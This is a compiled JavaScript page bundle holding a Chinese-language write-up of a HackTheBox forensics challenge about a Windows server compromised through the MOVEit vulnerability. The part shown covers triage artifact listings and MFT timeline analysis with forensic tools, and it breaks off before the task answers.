"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[68959],{93374:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>p,frontMatter:()=>r,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"HackTheBox/Sherlocks/i-like-to/index","title":"i-like-to","description":"We have unfortunately been hiding under a rock and did not see the many news articles referencing the recent MOVEit CVE being exploited in the wild. We believe our Windows server may be vulnerable and has recently fallen victim to this compromise. We need to understand this exploit in a bit more detail and confirm the actions of the attacker & retrieve some details so we can implement them into our SOC environment. We have provided you with a triage of all the necessary artifacts from our compromised Windows server. PS: One of the artifacts is a memory dump, but we forgot to include the vmss file. You might have to go back to basics here...","source":"@site/docs/HackTheBox/Sherlocks/i-like-to/index.md","sourceDirName":"HackTheBox/Sherlocks/i-like-to","slug":"/HackTheBox/Sherlocks/i-like-to/","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/i-like-to/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Sherlocks/i-like-to/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackTheBox_Sidebar","previous":{"title":"Tracer","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Tracer/"},"next":{"title":"ICS and SCADA Exploitation","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Tracks/ICS and SCADA Exploitation"}}');var t=i(74848),a=i(28453);const r={},o="i-like-to",l={},c=[{value:"\u9898\u76ee\u6570\u636e",id:"\u9898\u76ee\u6570\u636e",level:2},{value:"First of all",id:"first-of-all",level:2},{value:"\u9644\u4ef6\u89e3\u538b",id:"\u9644\u4ef6\u89e3\u538b",level:3},{value:"\u5185\u5b58\u955c\u50cf\u52a0\u8f7d",id:"\u5185\u5b58\u955c\u50cf\u52a0\u8f7d",level:3},{value:"MFT \u6570\u636e\u89e3\u6790",id:"mft-\u6570\u636e\u89e3\u6790",level:3},{value:"HTTP \u65e5\u5fd7",id:"http-\u65e5\u5fd7",level:3},{value:"Task 1",id:"task-1",level:2},{value:"Task 2",id:"task-2",level:2},{value:"Task 3",id:"task-3",level:2},{value:"Task 4",id:"task-4",level:2},{value:"Task 5",id:"task-5",level:2},{value:"Task 6",id:"task-6",level:2},{value:"Task 7",id:"task-7",level:2},{value:"Task 8",id:"task-8",level:2},{value:"Task 9",id:"task-9",level:2},{value:"Task 10",id:"task-10",level:2},{value:"Task 11",id:"task-11",level:2},{value:"Task 12",id:"task-12",level:2},{value:"Task 13",id:"task-13",level:2},{value:"Task 14",id:"task-14",level:2}];function d(e){const n={admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",img:"img",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"i-like-to",children:"i-like-to"})}),"\n",(0,t.jsxs)(n.admonition,{title:"Sherlock Scenario",type:"info",children:[(0,t.jsx)(n.p,{children:"We have unfortunately been hiding under a rock and did not see the many news articles referencing the recent MOVEit CVE being exploited in the wild. We believe our Windows server may be vulnerable and has recently fallen victim to this compromise. We need to understand this exploit in a bit more detail and confirm the actions of the attacker & retrieve some details so we can implement them into our SOC environment. We have provided you with a triage of all the necessary artifacts from our compromised Windows server. PS: One of the artifacts is a memory dump, but we forgot to include the vmss file. You might have to go back to basics here..."}),(0,t.jsx)(n.p,{children:"\u4e0d\u5e78\u7684\u662f\uff0c\u6211\u4eec\u4e00\u76f4\u8eb2\u5728\u5ca9\u77f3\u4e0b\u9762\uff0c\u6ca1\u6709\u770b\u5230\u5f88\u591a\u65b0\u95fb\u6587\u7ae0\u63d0\u53ca\u6700\u8fd1\u5728\u91ce\u5916\u5229\u7528\u7684 MOVEit CVE\u3002\u6211\u4eec\u8ba4\u4e3a\u6211\u4eec\u7684 Windows \u670d\u52a1\u5668\u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e\uff0c\u5e76\u4e14\u6700\u8fd1\u906d\u53d7\u4e86\u6b64\u6f0f\u6d1e\u7684\u653b\u51fb\u3002\u6211\u4eec\u9700\u8981\u66f4\u8be6\u7ec6\u5730\u4e86\u89e3\u6b64\u6f0f\u6d1e\uff0c\u5e76\u786e\u8ba4\u653b\u51fb\u8005\u7684\u884c\u4e3a\u5e76\u68c0\u7d22\u4e00\u4e9b\u8be6\u7ec6\u4fe1\u606f\uff0c\u4ee5\u4fbf\u6211\u4eec\u53ef\u4ee5\u5c06\u5b83\u4eec\u5b9e\u65bd\u5230\u6211\u4eec\u7684 SOC \u73af\u5883\u4e2d\u3002\u6211\u4eec\u4e3a\u60a8\u63d0\u4f9b\u4e86\u6765\u81ea\u6211\u4eec\u53d7\u635f Windows \u670d\u52a1\u5668\u7684\u6240\u6709\u5fc5\u8981\u5de5\u4ef6\u7684\u5206\u8bca\u3002PS\uff1a\u5176\u4e2d\u4e00\u4ef6\u5de5\u4ef6\u662f\u5185\u5b58\u8f6c\u50a8\uff0c\u4f46\u6211\u4eec\u5fd8\u8bb0\u5305\u542b vmss \u6587\u4ef6\u3002\u60a8\u53ef\u80fd\u5fc5\u987b\u56de\u5230\u8fd9\u91cc\u8ba8\u8bba\u57fa\u672c\u77e5\u8bc6..."})]}),"\n",(0,t.jsx)(n.h2,{id:"\u9898\u76ee\u6570\u636e",children:"\u9898\u76ee\u6570\u636e"}),"\n",(0,t.jsx)(n.admonition,{type:"note",children:(0,t.jsx)(n.p,{children:"\u7531\u4e8e\u9644\u4ef6\u8fc7\u5927\uff0c\u6545\u5728\u6b64\u4e0d\u63d0\u4f9b\u4e0b\u8f7d\u94fe\u63a5"})}),"\n",(0,t.jsx)(n.h2,{id:"first-of-all",children:"First of all"}),"\n",(0,t.jsxs)(n.p,{children:["\u6839\u636e\u9898\u76ee\u4e2d\u6240\u63d0\u5230\u7684 ",(0,t.jsx)(n.code,{children:"MOVEit CVE"})," \u4fe1\u606f\uff0c\u5b9a\u4f4d\u5230 ",(0,t.jsx)(n.code,{children:"CVE-2023-34362"})]}),"\n",(0,t.jsx)(n.h3,{id:"\u9644\u4ef6\u89e3\u538b",children:"\u9644\u4ef6\u89e3\u538b"}),"\n",(0,t.jsx)(n.p,{children:"\u9996\u5148\uff0c\u5148\u5c06\u9644\u4ef6\u89e3\u538b\u540e\uff0c\u5f97\u5230"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"D:.\n    I-like-to-27a787c5.vmem\n    Triage.zip\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u5c06 ",(0,t.jsx)(n.code,{children:"Triage.zip"})," \u89e3\u538b\u540e\uff0c\u5f97\u5230\u76ee\u5f55\u6811\uff08\u7ecf\u8fc7 URL Decode\uff09"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"D:.\n\u251c\u2500results\n\u2514\u2500uploads\n    \u251c\u2500auto\n    \u2502  \u251c\u2500\\\\.\\C:\n    \u2502  \u2502  \u2514\u2500Windows\n    \u2502  \u2502      \u2514\u2500System32\n    \u2502  \u2502          \u2514\u2500LogFiles\n    \u2502  \u2502              \u2514\u2500WMI\n    \u2502  \u2502                  \u2514\u2500RtBackup\n    \u2502  \u2514\u2500C:\n    \u2502      \u251c\u2500$Recycle.Bin\n    \u2502      \u2502  \u2514\u2500S-1-5-21-4088429403-1159899800-2753317549-500\n    \u2502      \u251c\u2500inetpub\n    \u2502      \u2502  \u2514\u2500logs\n    \u2502      \u2502      \u251c\u2500FailedReqLogFiles\n    \u2502      \u2502      \u2514\u2500LogFiles\n    \u2502      \u2502          \u2514\u2500W3SVC2\n    \u2502      \u251c\u2500MOVEitTransfer\n    \u2502      \u2502  \u2514\u2500Logs\n    \u2502      \u251c\u2500ProgramData\n    \u2502      \u2502  \u2514\u2500Microsoft\n    \u2502      \u2502      \u251c\u2500Windows\n    \u2502      \u2502      \u2502  \u2514\u2500Start Menu\n    \u2502      \u2502      \u2502      \u2514\u2500Programs\n    \u2502      \u2502      \u2514\u2500Windows Defender\n    \u2502      \u2502          \u2514\u2500Support\n    \u2502      \u251c\u2500Users\n    \u2502      \u2502  \u251c\u2500.NET v4.5\n    \u2502      \u2502  \u2502  \u2514\u2500AppData\n    \u2502      \u2502  \u2502      \u251c\u2500Local\n    \u2502      \u2502  \u2502      \u2502  \u2514\u2500Microsoft\n    \u2502      \u2502  \u2502      \u2502      \u2514\u2500Windows\n    \u2502      \u2502  \u2502      \u2514\u2500Roaming\n    \u2502      \u2502  \u2502          \u2514\u2500Microsoft\n    \u2502      \u2502  \u2502              \u2514\u2500Internet Explorer\n    \u2502      \u2502  \u2502                  \u2514\u2500Quick Launch\n    \u2502      \u2502  \u251c\u2500.NET v4.5 Classic\n    \u2502      \u2502  \u2502  \u2514\u2500AppData\n    \u2502      \u2502  \u2502      \u251c\u2500Local\n    \u2502      \u2502  \u2502      \u2502  \u2514\u2500Microsoft\n    \u2502      \u2502  \u2502      \u2502      \u2514\u2500Windows\n    \u2502      \u2502  \u2502      \u2514\u2500Roaming\n    \u2502      \u2502  \u2502          \u2514\u2500Microsoft\n    \u2502      \u2502  \u2502              \u2514\u2500Internet Explorer\n    \u2502      \u2502  \u2502                  \u2514\u2500Quick Launch\n    \u2502      \u2502  \u251c\u2500Administrator\n    \u2502      \u2502  \u2502  \u2514\u2500AppData\n    \u2502      \u2502  \u2502      \u251c\u2500Local\n    \u2502      \u2502  \u2502      \u2502  \u251c\u2500ConnectedDevicesPlatform\n    \u2502      \u2502  \u2502      \u2502  \u2502  \u2514\u2500L.Administrator\n    \u2502      \u2502  \u2502      \u2502  \u2514\u2500Microsoft\n    \u2502      \u2502  \u2502      \u2502      \u251c\u2500Internet Explorer\n    \u2502      \u2502  \u2502      \u2502      \u2502  \u251c\u2500CacheStorage\n    \u2502      \u2502  \u2502      \u2502      \u2502  \u251c\u2500DomainSuggestions\n    \u2502      \u2502  \u2502      \u2502      \u2502  \u251c\u2500EmieSiteList\n    \u2502      \u2502  \u2502      \u2502      \u2502  \u251c\u2500EmieUserList\n    \u2502      \u2502  \u2502      \u2502      \u2502  \u251c\u2500IECompatData\n    \u2502      \u2502  \u2502      \u2502      \u2502  \u251c\u2500IEFlipAheadCache\n    \u2502      \u2502  \u2502      \u2502      \u2502  \u251c\u2500imagestore\n    \u2502      \u2502  \u2502      \u2502      \u2502  \u2502  \u2514\u2500zxjua2i\n    \u2502      \u2502  \u2502      \u2502      \u2502  \u251c\u2500Recovery\n    \u2502      \u2502  \u2502      \u2502      \u2502  \u2502  \u2514\u2500High\n    \u2502      \u2502  \u2502      \u2502      \u2502  \u2502      \u2514\u2500Last Active\n    \u2502      \u2502  \u2502      \u2502      \u2502  \u251c\u2500Tiles\n    \u2502      \u2502  \u2502      \u2502      \u2502  \u2502  \u2514\u2500pin-314712940\n    \u2502      \u2502  \u2502      \u2502      \u2502  \u2514\u2500VersionManager\n    \u2502      \u2502  \u2502      \u2502      \u2514\u2500Windows\n    \u2502      \u2502  \u2502      \u2502          \u251c\u2500Explorer\n    \u2502      \u2502  \u2502      \u2502          \u251c\u2500History\n    \u2502      \u2502  \u2502      \u2502          \u2502  \u2514\u2500History.IE5\n    \u2502      \u2502  \u2502      \u2502          \u2502      \u2514\u2500MSHist012023061320230614\n    \u2502      \u2502  \u2502      \u2502          \u251c\u2500IEDownloadHistory\n    \u2502      \u2502  \u2502      \u2502          \u251c\u2500INetCookies\n    \u2502      \u2502  \u2502      \u2502          \u2502  \u251c\u2500DNTException\n    \u2502      \u2502  \u2502      \u2502          \u2502  \u2514\u2500ESE\n    \u2502      \u2502  \u2502      \u2502          \u2514\u2500WebCache\n    \u2502      \u2502  \u2502      \u2514\u2500Roaming\n    \u2502      \u2502  \u2502          \u2514\u2500Microsoft\n    \u2502      \u2502  \u2502              \u251c\u2500Internet Explorer\n    \u2502      \u2502  \u2502              \u2502  \u2514\u2500Quick Launch\n    \u2502      \u2502  \u2502              \u2502      \u2514\u2500User Pinned\n    \u2502      \u2502  \u2502              \u2502          \u2514\u2500TaskBar\n    \u2502      \u2502  \u2502              \u251c\u2500Protect\n    \u2502      \u2502  \u2502              \u2502  \u2514\u2500S-1-5-21-4088429403-1159899800-2753317549-500\n    \u2502      \u2502  \u2502              \u2514\u2500Windows\n    \u2502      \u2502  \u2502                  \u251c\u2500PowerShell\n    \u2502      \u2502  \u2502                  \u2502  \u2514\u2500PSReadLine\n    \u2502      \u2502  \u2502                  \u2514\u2500Recent\n    \u2502      \u2502  \u2502                      \u251c\u2500AutomaticDestinations\n    \u2502      \u2502  \u2502                      \u2514\u2500CustomDestinations\n    \u2502      \u2502  \u251c\u2500Default\n    \u2502      \u2502  \u2502  \u2514\u2500AppData\n    \u2502      \u2502  \u2502      \u2514\u2500Roaming\n    \u2502      \u2502  \u2502          \u2514\u2500Microsoft\n    \u2502      \u2502  \u2502              \u2514\u2500Internet Explorer\n    \u2502      \u2502  \u2502                  \u2514\u2500Quick Launch\n    \u2502      \u2502  \u251c\u2500dfir\n    \u2502      \u2502  \u2502  \u2514\u2500AppData\n    \u2502      \u2502  \u2502      \u251c\u2500Local\n    \u2502      \u2502  \u2502      \u2502  \u251c\u2500ConnectedDevicesPlatform\n    \u2502      \u2502  \u2502      \u2502  \u2502  \u2514\u2500L.dfir\n    \u2502      \u2502  \u2502      \u2502  \u2514\u2500Microsoft\n    \u2502      \u2502  \u2502      \u2502      \u251c\u2500Internet Explorer\n    \u2502      \u2502  \u2502      \u2502      \u2502  \u251c\u2500CacheStorage\n    \u2502      \u2502  \u2502      \u2502      \u2502  \u251c\u2500EmieSiteList\n    \u2502      \u2502  \u2502      \u2502      \u2502  \u251c\u2500EmieUserList\n    \u2502      \u2502  \u2502      \u2502      \u2502  \u251c\u2500IECompatData\n    \u2502      \u2502  \u2502      \u2502      \u2502  \u251c\u2500imagestore\n    \u2502      \u2502  \u2502      \u2502      \u2502  \u2502  \u2514\u2500lq16xzq\n    \u2502      \u2502  \u2502      \u2502      \u2502  \u2514\u2500Recovery\n    \u2502      \u2502  \u2502      \u2502      \u2502      \u2514\u2500Last Active\n    \u2502      \u2502  \u2502      \u2502      \u2514\u2500Windows\n    \u2502      \u2502  \u2502      \u2502          \u251c\u2500Explorer\n    \u2502      \u2502  \u2502      \u2502          \u251c\u2500History\n    \u2502      \u2502  \u2502      \u2502          \u2502  \u251c\u2500History.IE5\n    \u2502      \u2502  \u2502      \u2502          \u2502  \u2502  \u2514\u2500MSHist012023061320230614\n    \u2502      \u2502  \u2502      \u2502          \u2502  \u2514\u2500Low\n    \u2502      \u2502  \u2502      \u2502          \u2502      \u2514\u2500History.IE5\n    \u2502      \u2502  \u2502      \u2502          \u251c\u2500IEDownloadHistory\n    \u2502      \u2502  \u2502      \u2502          \u251c\u2500INetCookies\n    \u2502      \u2502  \u2502      \u2502          \u2502  \u251c\u2500DNTException\n    \u2502      \u2502  \u2502      \u2502          \u2502  \u251c\u2500ESE\n    \u2502      \u2502  \u2502      \u2502          \u2502  \u2514\u2500Low\n    \u2502      \u2502  \u2502      \u2502          \u2502      \u2514\u2500ESE\n    \u2502      \u2502  \u2502      \u2502          \u2514\u2500WebCache\n    \u2502      \u2502  \u2502      \u2514\u2500Roaming\n    \u2502      \u2502  \u2502          \u2514\u2500Microsoft\n    \u2502      \u2502  \u2502              \u251c\u2500Internet Explorer\n    \u2502      \u2502  \u2502              \u2502  \u2514\u2500Quick Launch\n    \u2502      \u2502  \u2502              \u2502      \u2514\u2500User Pinned\n    \u2502      \u2502  \u2502              \u2502          \u2514\u2500TaskBar\n    \u2502      \u2502  \u2502              \u251c\u2500Protect\n    \u2502      \u2502  \u2502              \u2502  \u2514\u2500S-1-5-21-4088429403-1159899800-2753317549-1007\n    \u2502      \u2502  \u2502              \u2514\u2500Windows\n    \u2502      \u2502  \u2502                  \u2514\u2500Recent\n    \u2502      \u2502  \u2502                      \u251c\u2500AutomaticDestinations\n    \u2502      \u2502  \u2502                      \u2514\u2500CustomDestinations\n    \u2502      \u2502  \u251c\u2500moveitsvc\n    \u2502      \u2502  \u2502  \u2514\u2500AppData\n    \u2502      \u2502  \u2502      \u251c\u2500Local\n    \u2502      \u2502  \u2502      \u2502  \u2514\u2500Microsoft\n    \u2502      \u2502  \u2502      \u2502      \u2514\u2500Windows\n    \u2502      \u2502  \u2502      \u2514\u2500Roaming\n    \u2502      \u2502  \u2502          \u2514\u2500Microsoft\n    \u2502      \u2502  \u2502              \u251c\u2500Internet Explorer\n    \u2502      \u2502  \u2502              \u2502  \u2514\u2500Quick Launch\n    \u2502      \u2502  \u2502              \u2514\u2500Protect\n    \u2502      \u2502  \u2502                  \u2514\u2500S-1-5-21-4088429403-1159899800-2753317549-1000\n    \u2502      \u2502  \u2514\u2500moveitsvc.WIN-LR8T2EF8VHM.002\n    \u2502      \u2502      \u2514\u2500AppData\n    \u2502      \u2502          \u251c\u2500Local\n    \u2502      \u2502          \u2502  \u251c\u2500ConnectedDevicesPlatform\n    \u2502      \u2502          \u2502  \u2502  \u2514\u2500L.moveitsvc\n    \u2502      \u2502          \u2502  \u2514\u2500Microsoft\n    \u2502      \u2502          \u2502      \u251c\u2500Internet Explorer\n    \u2502      \u2502          \u2502      \u2502  \u251c\u2500CacheStorage\n    \u2502      \u2502          \u2502      \u2502  \u2514\u2500IECompatData\n    \u2502      \u2502          \u2502      \u2514\u2500Windows\n    \u2502      \u2502          \u2502          \u251c\u2500Explorer\n    \u2502      \u2502          \u2502          \u251c\u2500History\n    \u2502      \u2502          \u2502          \u2502  \u2514\u2500History.IE5\n    \u2502      \u2502          \u2502          \u2514\u2500WebCache\n    \u2502      \u2502          \u2514\u2500Roaming\n    \u2502      \u2502              \u2514\u2500Microsoft\n    \u2502      \u2502                  \u251c\u2500Internet Explorer\n    \u2502      \u2502                  \u2502  \u2514\u2500Quick Launch\n    \u2502      \u2502                  \u2502      \u2514\u2500User Pinned\n    \u2502      \u2502                  \u2502          \u2514\u2500TaskBar\n    \u2502      \u2502                  \u251c\u2500Protect\n    \u2502      \u2502                  \u2502  \u2514\u2500S-1-5-21-4088429403-1159899800-2753317549-1006\n    \u2502      \u2502                  \u2514\u2500Windows\n    \u2502      \u2502                      \u251c\u2500PowerShell\n    \u2502      \u2502                      \u2502  \u2514\u2500PSReadLine\n    \u2502      \u2502                      \u2514\u2500Recent\n    \u2502      \u2502                          \u251c\u2500AutomaticDestinations\n    \u2502      \u2502                          \u2514\u2500CustomDestinations\n    \u2502      \u2514\u2500Windows\n    \u2502          \u251c\u2500appcompat\n    \u2502          \u2502  \u2514\u2500Programs\n    \u2502          \u251c\u2500INF\n    \u2502          \u251c\u2500ServiceProfiles\n    \u2502          \u2502  \u251c\u2500LocalService\n    \u2502          \u2502  \u2514\u2500NetworkService\n    \u2502          \u2502      \u2514\u2500AppData\n    \u2502          \u2502          \u2514\u2500Local\n    \u2502          \u2502              \u2514\u2500Microsoft\n    \u2502          \u2502                  \u2514\u2500Windows\n    \u2502          \u2502                      \u2514\u2500DeliveryOptimization\n    \u2502          \u2502                          \u2514\u2500Logs\n    \u2502          \u251c\u2500System32\n    \u2502          \u2502  \u251c\u2500config\n    \u2502          \u2502  \u2502  \u2514\u2500RegBack\n    \u2502          \u2502  \u251c\u2500LogFiles\n    \u2502          \u2502  \u2502  \u2514\u2500Sum\n    \u2502          \u2502  \u251c\u2500sru\n    \u2502          \u2502  \u251c\u2500Tasks\n    \u2502          \u2502  \u2502  \u2514\u2500Microsoft\n    \u2502          \u2502  \u2502      \u2514\u2500Windows\n    \u2502          \u2502  \u2502          \u251c\u2500.NET Framework\n    \u2502          \u2502  \u2502          \u251c\u2500Active Directory Rights Management Services Client\n    \u2502          \u2502  \u2502          \u251c\u2500AppID\n    \u2502          \u2502  \u2502          \u251c\u2500Application Experience\n    \u2502          \u2502  \u2502          \u251c\u2500ApplicationData\n    \u2502          \u2502  \u2502          \u251c\u2500AppxDeploymentClient\n    \u2502          \u2502  \u2502          \u251c\u2500Autochk\n    \u2502          \u2502  \u2502          \u251c\u2500BitLocker\n    \u2502          \u2502  \u2502          \u251c\u2500Bluetooth\n    \u2502          \u2502  \u2502          \u251c\u2500BrokerInfrastructure\n    \u2502          \u2502  \u2502          \u251c\u2500CertificateServicesClient\n    \u2502          \u2502  \u2502          \u251c\u2500Chkdsk\n    \u2502          \u2502  \u2502          \u251c\u2500Clip\n    \u2502          \u2502  \u2502          \u251c\u2500CloudExperienceHost\n    \u2502          \u2502  \u2502          \u251c\u2500Customer Experience Improvement Program\n    \u2502          \u2502  \u2502          \u251c\u2500Data Integrity Scan\n    \u2502          \u2502  \u2502          \u251c\u2500Defrag\n    \u2502          \u2502  \u2502          \u251c\u2500Device Information\n    \u2502          \u2502  \u2502          \u251c\u2500Device Setup\n    \u2502          \u2502  \u2502          \u251c\u2500Diagnosis\n    \u2502          \u2502  \u2502          \u251c\u2500DirectX\n    \u2502          \u2502  \u2502          \u251c\u2500DiskCleanup\n    \u2502          \u2502  \u2502          \u251c\u2500DiskDiagnostic\n    \u2502          \u2502  \u2502          \u251c\u2500DiskFootprint\n    \u2502          \u2502  \u2502          \u251c\u2500EDP\n    \u2502          \u2502  \u2502          \u251c\u2500ExploitGuard\n    \u2502          \u2502  \u2502          \u251c\u2500File Classification Infrastructure\n    \u2502          \u2502  \u2502          \u251c\u2500Flighting\n    \u2502          \u2502  \u2502          \u2502  \u251c\u2500FeatureConfig\n    \u2502          \u2502  \u2502          \u2502  \u2514\u2500OneSettings\n    \u2502          \u2502  \u2502          \u251c\u2500InstallService\n    \u2502          \u2502  \u2502          \u251c\u2500LanguageComponentsInstaller\n    \u2502          \u2502  \u2502          \u251c\u2500License Manager\n    \u2502          \u2502  \u2502          \u251c\u2500Location\n    \u2502          \u2502  \u2502          \u251c\u2500Maintenance\n    \u2502          \u2502  \u2502          \u251c\u2500Maps\n    \u2502          \u2502  \u2502          \u251c\u2500MemoryDiagnostic\n    \u2502          \u2502  \u2502          \u251c\u2500Mobile Broadband Accounts\n    \u2502          \u2502  \u2502          \u251c\u2500MUI\n    \u2502          \u2502  \u2502          \u251c\u2500Multimedia\n    \u2502          \u2502  \u2502          \u251c\u2500NetTrace\n    \u2502          \u2502  \u2502          \u251c\u2500Network Controller\n    \u2502          \u2502  \u2502          \u251c\u2500Offline Files\n    \u2502          \u2502  \u2502          \u251c\u2500PI\n    \u2502          \u2502  \u2502          \u251c\u2500PLA\n    \u2502          \u2502  \u2502          \u251c\u2500Plug and Play\n    \u2502          \u2502  \u2502          \u251c\u2500Power Efficiency Diagnostics\n    \u2502          \u2502  \u2502          \u251c\u2500PushToInstall\n    \u2502          \u2502  \u2502          \u251c\u2500Ras\n    \u2502          \u2502  \u2502          \u251c\u2500RecoveryEnvironment\n    \u2502          \u2502  \u2502          \u251c\u2500Registry\n    \u2502          \u2502  \u2502          \u251c\u2500Server Manager\n    \u2502          \u2502  \u2502          \u251c\u2500Servicing\n    \u2502          \u2502  \u2502          \u251c\u2500SharedPC\n    \u2502          \u2502  \u2502          \u251c\u2500Shell\n    \u2502          \u2502  \u2502          \u251c\u2500Software Inventory Logging\n    \u2502          \u2502  \u2502          \u251c\u2500SoftwareProtectionPlatform\n    \u2502          \u2502  \u2502          \u251c\u2500SpacePort\n    \u2502          \u2502  \u2502          \u251c\u2500Speech\n    \u2502          \u2502  \u2502          \u251c\u2500Storage Tiers Management\n    \u2502          \u2502  \u2502          \u251c\u2500Task Manager\n    \u2502          \u2502  \u2502          \u251c\u2500TextServicesFramework\n    \u2502          \u2502  \u2502          \u251c\u2500Time Synchronization\n    \u2502          \u2502  \u2502          \u251c\u2500Time Zone\n    \u2502          \u2502  \u2502          \u251c\u2500TPM\n    \u2502          \u2502  \u2502          \u251c\u2500UpdateOrchestrator\n    \u2502          \u2502  \u2502          \u251c\u2500UPnP\n    \u2502          \u2502  \u2502          \u251c\u2500User Profile Service\n    \u2502          \u2502  \u2502          \u251c\u2500WaaSMedic\n    \u2502          \u2502  \u2502          \u251c\u2500WDI\n    \u2502          \u2502  \u2502          \u251c\u2500Windows Defender\n    \u2502          \u2502  \u2502          \u251c\u2500Windows Error Reporting\n    \u2502          \u2502  \u2502          \u251c\u2500Windows Filtering Platform\n    \u2502          \u2502  \u2502          \u251c\u2500Windows Media Sharing\n    \u2502          \u2502  \u2502          \u251c\u2500WindowsColorSystem\n    \u2502          \u2502  \u2502          \u251c\u2500WindowsUpdate\n    \u2502          \u2502  \u2502          \u251c\u2500Wininet\n    \u2502          \u2502  \u2502          \u2514\u2500Workplace Join\n    \u2502          \u2502  \u251c\u2500wbem\n    \u2502          \u2502  \u2502  \u2514\u2500Repository\n    \u2502          \u2502  \u251c\u2500WDI\n    \u2502          \u2502  \u2502  \u2514\u2500LogFiles\n    \u2502          \u2502  \u2514\u2500winevt\n    \u2502          \u2502      \u2514\u2500Logs\n    \u2502          \u251c\u2500Tasks\n    \u2502          \u2514\u2500Temp\n    \u2514\u2500ntfs\n        \u2514\u2500\\\\.\\C:\n            \u2514\u2500$Extend\n                \u2514\u2500$RmMetadata\n                    \u2514\u2500$TxfLog\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5f88\u660e\u663e\u4e3a Windows \u7684\u65e5\u5fd7\u6587\u4ef6"}),"\n",(0,t.jsx)(n.h3,{id:"\u5185\u5b58\u955c\u50cf\u52a0\u8f7d",children:"\u5185\u5b58\u955c\u50cf\u52a0\u8f7d"}),"\n",(0,t.jsxs)(n.p,{children:["\u7531\u4e8e\u53ea\u6709 ",(0,t.jsx)(n.code,{children:"I-like-to-27a787c5.vmem"})," \u6587\u4ef6\uff0c\u6ca1\u6709 ",(0,t.jsx)(n.code,{children:"vmss"})," \u6587\u4ef6\uff0c\u5bfc\u81f4\u65e0\u6cd5\u4f7f\u7528 ",(0,t.jsx)(n.code,{children:"Volatility"})," \u5bf9\u5185\u5b58\u955c\u50cf\u8fdb\u884c\u89e3\u6790\uff0c\u4f46\u662f\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7 ",(0,t.jsx)(n.code,{children:"strings"})," \u548c ",(0,t.jsx)(n.code,{children:"R-Studio"})," \u7a0b\u5e8f\u5bf9\u5185\u5b58\u955c\u50cf\u8fdb\u884c\u89e3\u6790"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:i(29508).A+"",width:"2062",height:"1443"})}),"\n",(0,t.jsx)(n.h3,{id:"mft-\u6570\u636e\u89e3\u6790",children:"MFT \u6570\u636e\u89e3\u6790"}),"\n",(0,t.jsxs)(n.p,{children:["\u4f7f\u7528 ",(0,t.jsx)(n.code,{children:"MFTExplorer"})," \u8bfb\u53d6 ",(0,t.jsx)(n.code,{children:"\\iliketo\\Triage\\Triage\\uploads\\ntfs\\%5C%5C.%5CC%3A\\$MFT"})," \u6587\u4ef6"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:i(32058).A+"",width:"2130",height:"1030"})}),"\n",(0,t.jsx)(n.p,{children:"\u53ef\u4ee5\u8fd8\u539f\u51fa\u6765 NTFS \u6587\u4ef6\u7cfb\u7edf\u7684\u7ed3\u6784\u6570\u636e"}),"\n",(0,t.jsxs)(n.p,{children:["\u540c\u65f6\uff0c\u4f7f\u7528 ",(0,t.jsx)(n.code,{children:"MFTECmd"}),"+",(0,t.jsx)(n.code,{children:"TimelineExplorer"})," \u8fdb\u884c\u65f6\u95f4\u7ebf\u5206\u6790"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"PS D:\\_Tools\\_ForensicAnalyzer\\MFTECmd> .\\MFTECmd.exe -f D:\\Downloads\\iliketo\\Triage\\Triage\\uploads\\ntfs\\%5C%5C.%5CC%3A\\$MFT --csv D:\\Downloads\\iliketo\\Triage\\Triage\\uploads\\ntfs\\\nMFTECmd version 1.2.2.1\n\nAuthor: Eric Zimmerman (saericzimmerman@gmail.com)\nhttps://github.com/EricZimmerman/MFTECmd\n\nCommand line: -f D:\\Downloads\\iliketo\\Triage\\Triage\\uploads\\ntfs\\%5C%5C.%5CC%3A\\$MFT --csv ./out.csv\n\nWarning: Administrator privileges not found!\n\nFile type: Mft\n\nProcessed D:\\Downloads\\iliketo\\Triage\\Triage\\uploads\\ntfs\\%5C%5C.%5CC%3A\\MFT in 4.5830 seconds\n\nD:\\Downloads\\iliketo\\Triage\\Triage\\uploads\\ntfs\\%5C%5C.%5CC%3A\\$MFT: FILE records found: 318,161 (Free records: 214,500) File size: 520.2MB\nPath to ./out.csv doesn't exist. Creating...\n        CSV output will be saved to D:\\Downloads\\iliketo\\Triage\\Triage\\uploads\\ntfs\\20240322151222_MFTECmd_$MFT_Output.csv\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u5bf9\u5f97\u5230\u7684 ",(0,t.jsx)(n.code,{children:"20240322151222_MFTECmd_$MFT_Output.csv"})," \u6587\u4ef6\uff0c\u4f7f\u7528 ",(0,t.jsx)(n.code,{children:"TimelineExplorer"})," \u8fdb\u884c\u52a0\u8f7d"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:i(80697).A+"",width:"1970",height:"1090"})}),"\n",(0,t.jsx)(n.h3,{id:"http-\u65e5\u5fd7",children:"HTTP \u65e5\u5fd7"}),"\n",(0,t.jsxs)(n.p,{children:["HTTP \u65e5\u5fd7\u6587\u4ef6\u4f4d\u4e8e 